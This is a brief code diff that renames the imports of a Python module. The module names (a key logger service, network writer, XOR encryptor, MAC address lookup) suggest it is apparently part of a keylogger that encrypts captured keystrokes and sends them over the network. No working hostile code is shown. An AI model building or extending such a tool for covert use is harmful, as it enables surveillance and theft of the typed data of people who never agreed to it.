@@ -1,8 +1,8 @@
-from KeyLoggerService import KeyLoggerService
+from key_logger_service import KeyLoggerService
 from network_writer import NetworkWriter
-from FileWriter import FileWriterWithTime
-from Encryptor import XorEncryptor
-from Get_mac import get_mac_address
+from file_writer_with_time import FileWriterWithTime
+from xor_encryptor import XorEncryptor
+from get_mac_address import get_mac_address
 from time import sleep
 
 
